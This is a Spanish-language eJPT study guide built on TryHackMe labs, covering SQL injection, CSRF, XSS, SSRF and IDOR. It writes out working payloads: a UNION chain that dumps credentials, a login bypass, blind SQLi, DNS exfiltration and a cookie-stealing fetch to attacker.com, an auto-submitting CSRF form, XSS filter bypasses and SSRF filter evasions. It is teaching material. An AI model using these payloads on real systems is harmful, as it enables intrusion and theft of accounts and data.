<h1>
  <img src="https://cdn-images.tryhackme.com/modules/web-application-vulnerabilities-i-1778910743514.svg" width="55px">
  <span> VULNERABILIDADES EN APLICACIONES WEB I</span>
</h1>
 
### *Guía de Referencia y Explotación – Certificación eJPT*

---

> **Estructura del Manual:** Organizado exactamente según el itinerario de estudio de TryHackMe (**Web Application Vulnerabilities I**). Cada sección corresponde a una sala/tema y se subdivide en sus módulos y tareas específicas con todos los títulos y contenidos traducidos al español para facilitar el estudio, la consulta directa en exámenes y la preparación de clases.

---

##  Matriz de Consulta Rápida (Tabla de Referencia Express)

| Vulnerabilidad | Vector / Dónde Buscar | Payload / Prueba Rápida | Indicador de Éxito |
| :--- | :--- | :--- | :--- |
| **Inyección SQL (SQLi)** | Parámetros URL (`?id=1`), formularios de login, campos de búsqueda. | `'` &#124; `"` &#124; `' OR 1=1;--` &#124; `UNION SELECT 1,2,3--` | Mensajes de error SQL, bypass de login, datos de otras tablas en pantalla. |
| **Falsificación CSRF** | Cambios de estado (email, clave) sin tokens en formularios POST/GET. | Formulario HTML oculto con envío automático JS (`document.forms[0].submit()`). | Cambio de estado realizado sin consentimiento del usuario autenticado. |
| **Scripts Cruzados (XSS)** | Entradas reflejadas en HTML, comentarios, campos de perfil, fragmentos DOM. | `<script>alert('XSS')</script>` &#124; `"><img src=x onerror=alert(1)>` | Ejecución de alerta JavaScript o pop-up en el navegador de la víctima. |
| **Falsificación SSRF** | Parámetros que reciben URLs, imágenes, webhooks, generadores de PDF. | `http://127.0.0.1`, `http://127.1`, `http://169.254.169.254` | Acceso a servicios internos, metadatos cloud de AWS/GCP o conexiones salientes. |
| **Referencias IDOR** | Identificadores en URLs (`?user_id=105`), JSON POST, rutas REST API. | Cambiar ID (`105` $\rightarrow$ `106`), decodificar Base64, probar Técnica de 2 Cuentas. | Visualización o modificación de datos pertenecientes a otro usuario. |

---

<br><br>

<h2>
  <img src="https://cdn-images.tryhackme.com/room-icons/6808d44047ac5684351c94da-1779110941603" width="40px">
  <span>Introducción a la Inyección SQL</span>
</h2>


<h3>1.1 Fundamentos de SQL para Inyección</h3>
Antes de profundizar en las técnicas de inyección, es fundamental comprender ciertos bloques de construcción del lenguaje SQL que permiten manipular las consultas de forma avanzada.

Los comentarios en SQL le indican a la base de datos que ignore todo el texto que aparece a continuación en la misma línea. En MySQL se utiliza el doble guión seguido de un espacio (`-- `) o el símbolo de almohadilla (`#`), mientras que los comentarios multilínea utilizan `/* */`. En un ataque, comentar el resto de la consulta es crucial para eliminar la sintaxis posterior que generaría un error de código.

El operador `UNION` combina los resultados de dos o más instrucciones `SELECT` en un único conjunto de respuestas. La regla fundamental es que ambas consultas deben devolver exactamente el mismo número de columnas y con tipos de datos compatibles. Esta técnica permite concatenar una consulta propia para extraer información de tablas distintas.

El operador `LIKE` realiza búsquedas de patrones mediante comodines: el porcentaje (`%`) representa cualquier secuencia de caracteres y el guión bajo (`_`) representa un único carácter. Es una herramienta clave en inyecciones ciegas para adivinar datos carácter por carácter. Por su parte, la cláusula `LIMIT` (sintaxis `LIMIT offset, count`) permite restringir el número de filas devueltas, evitando saturar la pantalla o seleccionando registros específicos.

Las funciones de cadenas facilitan la exfiltración masiva. La función `GROUP_CONCAT()` agrupa valores de múltiples filas en una sola cadena separada por comas, mientras que `CONCAT()` une distintos campos en un único resultado legible, como usuario y contraseña separados por dos puntos.

Por último, la base de datos `information_schema` es el catálogo de metadatos presente en motores como MySQL, MariaDB y PostgreSQL. Destacan dos tablas principales: `information_schema.tables` (que enumera todas las tablas de la base de datos) e `information_schema.columns` (que detalla los nombres de las columnas de cada tabla).

<br>

<h3>1.2 ¿Qué es la Inyección SQL?</h3>


La inyección SQL ocurre cuando una aplicación web toma la entrada proporcionada por el usuario y la concatena directamente dentro de una consulta SQL sin desinfectarla ni parametrizarla adecuadamente. Como resultado, el intérprete de la base de datos trata la entrada del usuario como código ejecutable en lugar de como datos planos.

Las aplicaciones web dinámicas consultan la base de datos constantemente para construir el contenido visualizado. Si el código fuente backend construye una instrucción mediante concatenación directa de cadenas, cualquier carácter especial introducido en los parámetros cambiará la lógica del comando.

Existen tres categorías principales de inyección SQL según la forma en que el atacante recibe la retroalimentación de la base de datos: En Banda (In-Band, donde los datos o errores se muestran directamente en la respuesta HTTP), Ciega (Blind, donde no hay datos explícitos y hay que inferir la información mediante respuestas booleanas o retardos de tiempo) y Fuera de Banda (Out-of-Band, donde se fuerza a la base de datos a enviar los datos a un servidor externo).

Para detectar vulnerabilidades SQLi, el método inicial consiste en inyectar caracteres de prueba como la comilla simple (`'`), la comilla doble (`"`), el comentario (`;--`) o condiciones lógicas (`OR 1=1`) en parámetros de URL, formularios de login, encabezados HTTP o cookies, observando si la aplicación devuelve errores internos o cambia su comportamiento.

<br>

<h3>1.3 Inyección SQL In Band</h3>

La inyección en banda es el tipo más directo y sencillo de explotar porque el mismo canal utilizado para enviar el payload muestra los datos extraídos.

#### Inyección Basada en Errores (Error-Based)
Aprovecha las configuraciones deficientes donde la aplicación expone mensajes de error detallados del motor de base de datos. Estos errores revelan la estructura de la consulta, el tipo de motor utilizado e incluso datos internos cuando se provocan fallos deliberados.

#### Inyección Basada en UNION (Union-Based)
Utiliza el operador `UNION` para adjuntar una consulta `SELECT` secundaria. La metodología de explotación sigue estos pasos secuenciales:

1. **Determinar el número de columnas:** Inyectar `UNION SELECT 1,2,3--` incrementando valores hasta que la página no devuelva un error.
2. **Identificar columnas visibles:** Cambiar el parámetro inicial a un valor inexistente (ejemplo `id=0`) para que la consulta original no devuelva filas y solo se impriman en pantalla los números de la consulta inyectada (`0 UNION SELECT 1,2,3--`).
3. **Extraer el nombre de la base de datos:** Reemplazar el número de la columna visible por la función de sistema (`0 UNION SELECT 1,database(),3--`).
4. **Enumerar tablas:** Consultar la tabla de metadatos (`0 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--`).
5. **Enumerar columnas:** Consultar las columnas de la tabla objetivo (`0 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--`).
6. **Extraer datos:** Extraer los registros deseados (`0 UNION SELECT 1,group_concat(username,':',password),3 FROM users--`).

<br> 

<h3> 1.4 Inyección SQL Ciega: Anulación de Autenticación </h3>
En la inyección ciega, la aplicación web no muestra resultados de la consulta ni mensajes de error. El bypass de autenticación es el ejemplo más claro: la aplicación únicamente responde si el inicio de sesión fue exitoso o fallido.

Las consultas de autenticación tradicionales verifican si existe un registro que coincida con el usuario y la contraseña proporcionados. Al inyectar una condición que siempre sea verdadera y comentar el resto de la consulta, la base de datos valida la solicitud sin conocer la clave.

```sql
-- Payload inyectado en el campo usuario:
' OR 1=1;--

-- Consulta resultante en el backend:
SELECT * FROM users WHERE username='' OR 1=1;--' AND password='...';
```

Al ser la condición `1=1` siempre verdadera y estar la verificación de contraseña comentada, la base de datos devuelve el primer registro de la tabla (habitualmente la cuenta de administrador), concediendo acceso inmediato.

<br>

<h3> 1.5 Inyección SQL Ciega: Basada en Booleanos y Tiempo</h3>
Cuando se requiere exfiltrar información de una base de datos sin salida visible, se utilizan técnicas ciegas basadas en preguntas de Sí/No.

#### Inyección Ciega Basada en Booleanos
La aplicación devuelve dos estados diferentes según la validez de la condición (por ejemplo, mostrar un mensaje de "usuario existente" versus "no encontrado"). Se inyectan condiciones lógicas combinadas con funciones de cadena e instrucciones `LIKE` para adivinar el nombre de las bases de datos, tablas y valores carácter por carácter.

```sql
-- Probar si el primer carácter empieza por 'a':
admin' AND database() LIKE 'a%
```

#### Inyección Ciega Basada en Tiempo
Se utiliza cuando la respuesta visual de la página es absolutamente idéntica ante cualquier entrada. La única señal disponible es el tiempo que tarda el servidor en responder. Se inyecta la función `SLEEP(5)` en MySQL o `WAITFOR DELAY '0:0:5'` en MSSQL envuelta en una condición lógica. Si la condición es verdadera, el servidor pausará su respuesta durante el tiempo indicado.

```sql
-- Pausa de 5 segundos si la primera letra de la BD es 's':
1' AND IF(SUBSTRING(database(),1,1)='s', SLEEP(5), 0)--
```

<br>

<h3>1.6 Inyección SQL Fuera de Banda (Out-of-Band / OOB)</h3>
La inyección fuera de banda se utiliza cuando las técnicas en banda no son posibles y las respuestas ciegas resultan demasiado ruidosas o inestables por latencia de red. Requiere que el servidor de base de datos tenga permisos y capacidad para realizar conexiones salientes a Internet.

En sistemas MySQL sobre Windows, se utiliza la función `LOAD_FILE()` especificando una ruta UNC hacia un servidor DNS o SMB controlado por el atacante. Al intentar resolver el recurso compartido, la base de datos realiza una consulta DNS incluyendo los datos robados dentro del subdominio.

```sql
-- Exfiltración DNS en MySQL vía ruta UNC:
SELECT LOAD_FILE(CONCAT('\\', (SELECT database()), '.attacker.com\share'));
```

En Microsoft SQL Server (MSSQL), se emplean procedimientos almacenados como `xp_dirtree` para forzar la búsqueda de directorios remotos y activar la resolución DNS, o `xp_cmdshell` (si está habilitado) para ejecutar comandos de sistema operativo como `nslookup` o `curl`.

<br>

<h3>1.7 Remediación y Prevención</h3>
La prevención efectiva de inyección SQL requiere aplicar defensas en profundidad, destacando la separación física del código y los datos.

* **Consultas Preparadas (Sentencias Parametrizadas):** Es la solución definitiva. Se definen marcadores de posición (`?` o `%s`) en la estructura SQL y la base de datos trata los valores de entrada estrictamente como literales de datos, imposibilitando que alteren la lógica de la consulta.
* **Validación de Entrada (Listas de Permitidos):** Comprobar que los datos cumplen con el tipo y formato esperado (por ejemplo, forzar que un parámetro de ID sea exclusivamente numérico).
* **Escapado de Caracteres:** Colocar barras invertidas ante caracteres especiales (`'`). Es una medida frágil que debe evitarse a favor de consultas preparadas.
* **Principio de Mínimo Privilegio:** Configurar la cuenta de base de datos de la web con los permisos mínimos indispensables, impidiendo ejecuciones de comandos de sistema o lectura de esquemas administrativos.
* **Firewalls de Aplicación Web (WAF):** Inspeccionan las peticiones entrantes para bloquear patrones de ataque conocidos, funcionando como una capa de protección complementaria.

<br>

---

<br><br>

<h2>
  <img src="https://cdn-images.tryhackme.com/room-icons/62a7685ca6e7ce005d3f3afe-1775466711834" width="45px">
  <span>Introducción a CSRF (Falsificación de Solicitudes)</span>
</h2>

<h3> 2.1 Introducción</h3>
Las aplicaciones web modernas dependen en gran medida de las sesiones autenticadas para realizar acciones en nombre de los usuarios. Cuando inicias sesión en un sitio web, tu navegador almacena una cookie de sesión que permite a la aplicación reconocerte en futuras solicitudes. Si bien esto hace que las aplicaciones web sean convenientes de usar, también crea oportunidades para que los atacantes abusen de esta confianza. Uno de esos ataques es la falsificación de solicitudes entre sitios (CSRF).

En lugar de robar credenciales, CSRF engaña al navegador de una víctima para que realice acciones en un sitio web donde la víctima ya está autenticada. Debido a que el navegador incluye automáticamente cookies con las solicitudes, la aplicación web puede tratar la solicitud maliciosa como legítima.

<br>

<h3> 2.2 ¿Qué es CSRF?</h3>
CSRF es una vulnerabilidad web en la que un atacante engaña al navegador de un usuario para que envíe una solicitud a un sitio web donde el usuario ya está autenticado. Debido a que el navegador incluye automáticamente cookies de sesión con cada solicitud, la aplicación web asume que la solicitud fue realizada intencionalmente por el usuario.
<img src="https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1775481672467.png">

<br>

<h3>2.2 Cómo funcionan los ataques CSRF</h3>
Un ataque CSRF típico sigue tres pasos simples:
1. La víctima inicia sesión en una aplicación web legítima y su navegador almacena una cookie de sesión.
2. El atacante engaña a la víctima para que visite una página web maliciosa que contiene una solicitud elaborada.
3. El navegador de la víctima envía automáticamente la solicitud a la aplicación de destino junto con la cookie de sesión almacenada, procesándola el servidor como legítima.

#### - Por qué es peligroso (CONTINUAR AQUI)
Los ataques CSRF se pueden utilizar para cambiar la dirección de correo electrónico de un usuario, actualizar la configuración de la cuenta, realizar transacciones financieras o modificar preferencias de seguridad sin el consentimiento ni conocimiento de la víctima.

<h3> 2.3 Por qué funciona CSRF</h3>
La vulnerabilidad no existe porque los navegadores estén rotos, sino porque se comportan exactamente como fueron diseñados. El problema ocurre cuando una aplicación web confía demasiado en las solicitudes.

Cuando un usuario inicia sesión, el servidor envía una cookie de sesión que actúa como tarjeta de identidad. El detalle clave es que el navegador envía automáticamente las cookies asociadas a cada solicitud enviada al mismo dominio, sin importar si la petición se generó desde el sitio legítimo o desde una página maliciosa externa en otro lugar de Internet.

#### Condiciones clave para un ataque CSRF (Key Conditions for a CSRF Attack)
Para que un ataque CSRF funcione, se deben cumplir tres condiciones principales:
1. La víctima debe estar autenticada en la aplicación de destino.
2. La aplicación debe realizar una acción de cambio de estado (modificar datos o configuraciones).
3. La aplicación no debe verificar si la solicitud proviene de una fuente de confianza.

### 2.4 Identificación de Vulnerabilidades CSRF (Finding CSRF Vulnerabilities)
Un pentester debe enfocarse en solicitudes que cambian el estado de la aplicación. La pregunta clave a realizarse durante una auditoría es: *¿Se puede activar esta acción sin verificar que la solicitud realmente vino del usuario?*

#### Funciones comunes vulnerables a CSRF (Common Features Vulnerable to CSRF)
Cambios de correo electrónico, restablecimiento de contraseñas, transferencias de fondos, modificaciones de perfil y actualizaciones de claves API.

#### GET vs POST: Un mito común (GET vs POST - A Common Misconception)
Muchos desarrolladores asumen que usar el método POST protege automáticamente contra CSRF. Esto es falso. Tanto las solicitudes GET como POST pueden ser abusadas si la aplicación no verifica el origen de la solicitud.

### 2.5 Explotación mediante Formularios HTML (Exploitation using HTML Form)
#### Práctica y Creación de la Página Maliciosa (Practical & Crafting a Malicious Page)
En la aplicación StaffHub (`http://staffhub.thm:8080`), la página de configuración permite actualizar el correo electrónico mediante un formulario POST sin tokens anti-CSRF ni mecanismos de verificación de origen.

Un atacante crea una página HTML maliciosa (`settings.html`) alojada en su servidor con un formulario oculto y JavaScript que lo envía automáticamente al cargar la página:

```html
<form action="http://staffhub.thm:8080/settings" method="POST">
  <input type="hidden" name="email" value="attacker@evilmail.thm" />
</form>
<script>
  document.forms[0].submit();
</script>
```

#### ¿Qué sucedió exactamente? (What Exactly Happened?)
Cuando la víctima autenticada visita el enlace malicioso, su navegador ejecuta el script y envía la solicitud POST al servidor de StaffHub adjuntando automáticamente la cookie de sesión activa. Al carecer de validación de origen, el servidor procesa el cambio y actualiza la dirección de correo a `attacker@evilmail.thm`.

---

## 3. Introducción a XSS (XSS Introduction)

### 3.1 Introducción y Terminología Importante (Introduction & Important Terminologies)
El Cross-Site Scripting (XSS) ocurre cuando una aplicación web incluye datos no confiables proporcionados por el usuario dentro de una página web sin filtrarlos o codificarlos previamente, permitiendo la ejecución de JavaScript en el navegador de la víctima.

#### Términos clave:
- **Document Object Model (DOM):** Representación estructurada en memoria en forma de árbol de una página web que JavaScript puede leer y modificar dinámicamente.
- **Parámetros URL:** Cadenas de consulta tras el carácter `?` que pasan datos al sitio y deben tratarse siempre como entradas no confiables.
- **JavaScript:** Lenguaje de script cliente que ejecuta los payloads XSS en el contexto de la página de la víctima.
- **Cookies y HttpOnly:** Las cookies almacenan datos de sesión. La bandera `HttpOnly` impide que JavaScript pueda leer la cookie mediante `document.cookie`.
- **Escapado (Output Encoding) vs Filtrado:** Escapar transforma caracteres especiales (`<` a `&lt;`) para que el navegador los trate como texto y no como código ejecutable.

### 3.2 Payloads de XSS (XSS Payloads)
Un payload XSS es el código JavaScript inyectado. Consta de dos partes:
1. **Intención:** Lo que el código pretende hacer (demostrar PoC, robar cookies de sesión, registrar pulsaciones de teclas o ejecutar acciones de lógica de negocio).
2. **Arreglo/Ajuste:** Adaptación del payload según el contexto HTML donde se refleja la entrada.

#### Pruebas y Ejemplos de Intención
- **Prueba de concepto básica:** `<script>alert('XSS')</script>`.
- **Robo de sesión:** `fetch('http://attacker.com/log?cookie=' + btoa(document.cookie))`.
- **Keylogger:** Registro de eventos de teclado mediante listeners JS.
- **Lógica de negocio:** Ejecución involuntaria de funciones JS internas de la aplicación (ej. `user.changeEmail()`).

### 3.3 XSS Reflejado - No Persistente (Reflected XSS - Non-Persistent)
Ocurre cuando la entrada del usuario (en parámetros de URL o búsquedas) se refleja inmediatamente en la respuesta de la página web sin sanear. Requiere que la víctima haga clic en un enlace preparado por el atacante.
- **Causa Raíz:** Pasar parámetros no confiables (ej. `request.args.get("q")`) directamente a plantillas que renderizan HTML no escapado.

### 3.4 XSS Almacenado - Persistente (Stored XSS - Persistent)
Ocurre cuando la entrada maliciosa se guarda permanentemente en la base de datos (sección de comentarios, libros de visitas, biografías de perfil) y se sirve a cada usuario que visita la página.
- **Causa Raíz:** Almacenar la entrada sin filtrar y utilizar marcas de renderizado seguro desactivado (ej. `{{ comment|safe }}` en Jinja2/Flask).

### 3.5 XSS Basado en DOM - Lado del Cliente (DOM-Based XSS - Client Side)
Ocurre cuando el código JavaScript del cliente lee datos controlables por el usuario desde una fuente del DOM (*Source*, como `location.search` o `location.hash`) y los escribe en un punto de ejecución inseguro (*Sink*, como `innerHTML` o `eval()`). La carga útil no necesita tocar el servidor backend.

### 3.6 XSS Ciego (Blind XSS)
Variante del XSS almacenado donde el payload se guarda pero se ejecuta en un panel administrativo o portal privado al que el atacante no tiene acceso visual (ej. tickets de soporte vistos por empleados).
- **Metodología de prueba:** Inyectar un payload con una llamada saliente HTTP/DNS hacia un listener controlado (ej. Netcat `nc -nlvp 9001` o XSS Hunter Express) que capture `document.cookie` y la URL interna del panel.

### 3.7 Perfeccionamiento del Payload (Perfecting your Payload)
Adaptación según la estructura del código fuente reflejado (Laboratorio de Niveles 1 al 6):
- **Nivel 1 (HTML Plano):** `<script>alert('THM')</script>`
- **Nivel 2 (Atributo de etiqueta `<input value="...">`):** Escapar con `"> <script>alert('THM')</script>`
- **Nivel 3 (Bloque `<textarea>`):** Escapar cerrando la etiqueta previa: `</textarea><script>alert('THM')</script>`
- **Nivel 4 (Dentro de bloque Script existente):** Escapar de la variable JS: `';alert('THM');//`
- **Nivel 5 (Filtro de palabras como `script`):** Bypassear la eliminación usando etiquetas anidadas: `<scr<script>ipt>alert('THM')</scr<script>ipt>`
- **Nivel 6 (Filtro de caracteres `<` y `>`):** Inyección mediante eventos de imágenes: `/images/cat.jpg" onload="alert('THM');`
- **Políglotas XSS:** Cadenas diseñadas para romper múltiples contextos simultáneamente.

---

## 4. Introducción a SSRF (Intro to SSRF)

### 4.1 Introducción y ¿Qué es SSRF? (Introduction & What is SSRF?)
Server-Side Request Forgery (SSRF) es una vulnerabilidad que permite a un atacante forzar a la aplicación del lado del servidor a realizar solicitudes HTTP hacia un destino de su elección (servicios internos, endpoints de metadatos en la nube o servidores externos).

SSRF explota la confianza implícita que los sistemas backend otorgan a las peticiones originadas desde la IP interna del servidor de aplicaciones, omitiendo autenticaciones adicionales.

#### Tipos de SSRF
- **SSRF Regular:** La respuesta del recurso interno se muestra directamente en la respuesta HTTP recibida por el usuario.
- **SSRF Ciego (Blind SSRF):** El servidor realiza la solicitud pero no devuelve el contenido. Se confirma mediante registros en listeners externos (Burp Collaborator, `python3 -m http.server`) o análisis de diferencias de tiempos de respuesta.

#### Impacto
Acceso a paneles de administración internos, exposición de datos sensibles, reconocimiento de red privada y robo de credenciales en la nube mediante el endpoint de metadatos de instancia `169.254.169.254` (AWS, GCP, Azure).

### 4.2 Ejemplos de Vectores SSRF (SSRF Examples)
1. **URL completa en un parámetro:** `?url=https://server.website.thm/api/item`. Se reemplaza por `?url=http://127.0.0.1/admin`.
2. **URL parcial (Solo nombre de host o ruta):** Modificación del parámetro de servidor para apuntar a dominios del atacante.
3. **Path Traversal en la URL:** Uso de `/../admin` cuando solo se controla un segmento de la ruta.
4. **Campos de formulario ocultos:** Modificación de rutas de avatares o archivos almacenados en campos `<input type="hidden">`.

### 4.3 Identificación de SSRF (Finding an SSRF)
Indicadores comunes en parámetros URL, configuraciones de webhooks, generadores de informes PDF, funciones de vista previa de URLs e importación remota de archivos.

### 4.4 Anulación de Defensas Comunes de SSRF (Defeating Common SSRF Defenses)
#### Bypasses de Listas de Denegación (Deny Lists)
Elusión de bloqueos de `127.0.0.1` o `localhost`:
- Formato Abreviado: `127.1` o `0`
- Formato Decimal: `2130706433`
- Formato Octal: `017700000001`
- IPv6: `[::1]`
- DNS Comodín: Uso de dominios como `127.0.0.1.nip.io`

#### Bypasses de Listas de Permitidos (Allow Lists)
- Coincidencia de subdominios: `https://website.thm.attacker.com`
- Abuso de credenciales de URL con `@`: `https://website.thm@attacker.com`

#### Redirecciones Abiertas (Open Redirects)
Encadenamiento de un endpoint interno con redirección abierta `302` para eludir restricciones de dominio de origen.

---

## 5. Referencias Directas Inseguras a Objetos (IDOR)

### 5.1 ¿Qué es un IDOR? (What is an IDOR?)
IDOR (Insecure Direct Object Reference) es una vulnerabilidad de control de acceso que ocurre cuando una aplicación utiliza una referencia directa suministrada por el usuario (un número o cadena) para recuperar un objeto de la base de datos sin comprobar si el usuario actual tiene autorización sobre dicho objeto.

Está clasificada en la posición #1 del OWASP Top 10 (Broken Access Control) y bajo el nombre BOLA (Broken Object Level Authorization) en la API Top 10 de OWASP.

#### Ejemplo de IDOR
Navegar a `https://sitio.com/profile?user_id=1305` y cambiar el parámetro a `user_id=1000`. Si se muestra la información privada del otro usuario, existe IDOR. La causa es que la aplicación valida la **Autenticación** (sabe quién eres) pero omite la **Autorización** (no valida si tu sesión es dueña del registro `1000`).

### 5.2 Descubrimiento de IDORs según el formato del identificador
1. **Identificadores Codificados (Encoded IDs):** Uso de Base64 (`eyJ1c2VyX2lkIjogNX0=`). El flujo de explotación requiere: Decodificar (`echo 'valor' | base64 -d`) $\rightarrow$ Modificar el ID $\rightarrow$ Recodificar (`echo 'valor' | base64`) $\rightarrow$ Reenviar la petición.
2. **Identificadores Hasheados (Hashed IDs):** Uso de MD5 (32 caracteres), SHA-1 (40 caracteres) o SHA-256 (64 caracteres) sobre enteros predecibles. Se calculan hashes de valores secuenciales o se usan tablas de búsqueda como CrackStation.
3. **Identificadores Impredecibles / UUIDs:** UUIDs como `d3b07384-d9a0-4e9b-8b3c-2f1a6c7e4a90`. Se aplica la **Técnica de Auditoría de Dos Cuentas** (obtener el UUID del usuario A e intentarlo consumir autenticado con el usuario B).

### 5.3 Dónde se localizan los IDORs (Where are IDORs located)
- **Solicitudes de antecedentes (AJAX / REST APIs):** Peticiones HTTP asíncronas visibles en la pestaña Red del navegador o Burp Suite (`/api/v1/customer?id=15`).
- **Archivos JavaScript:** Análisis de código cliente para descubrir endpoints de API y nombres de parámetros ocultos.
- **Minería de parámetros (Parameter Mining):** Agregar parámetros no expuestos en la interfaz gráfica (`?user_id=123`) a peticiones que normalmente no los solicitan.
- **Ubicaciones comunes:** Parámetros de URL, cuerpo POST/JSON, cookies, encabezados HTTP personalizados y segmentos de ruta REST (`/api/users/123/orders`).

